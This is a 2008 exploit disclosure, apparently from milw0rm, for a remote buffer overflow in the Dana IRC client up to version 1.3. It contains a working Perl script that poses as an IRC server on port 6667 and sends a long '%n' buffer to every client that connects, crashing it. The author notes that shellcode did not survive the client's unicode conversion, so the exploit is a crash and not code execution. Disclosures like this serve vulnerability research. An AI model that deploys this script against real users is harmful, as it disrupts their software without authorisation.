- Dana IRC <= 1.3 Remote Buffer Overflow POC/Crash -

	Discovered On: 14 JUNE 2008
	Discovered By: t0pP8uZz

	Download: diebestenbits.de


	- Info -

	Dana Irc client suffers from a remote buffer overflow, sending a buffer of around 2k
	overwrites the EIP therefor crashes the client. The reason why there isnt any shellcode here
	is because the client is coverting the junk/buffer data to unicode so its corrupting the shellcode
	ive tried sending unicode buffer but the same problem occurs.
	
	if anyone else can get further please let me know. but i doubt you can.

	there are also other registers you can overwrite using diffrent junk data to overflow them.

	the peice of perl code below will listen on port 6667 and when a Dana IRC client connects
	it will crash the client. its also possible to send the data direct to the user.

	peace, t0pP8uZz

#!/usr/bin/perl

use IO::Socket;

$sock = IO::Socket::INET->new( Proto => 'tcp', LocalPort => '6667', Listen => SOMAXCONN, Reuse => 1 );

$jnk = "%n"x1000;
print "Running..";
while($client = $sock->accept()) {
    print $client "$jnk\r\n";
    print "Crashed Client!\n";
}

# milw0rm.com [2008-06-14]
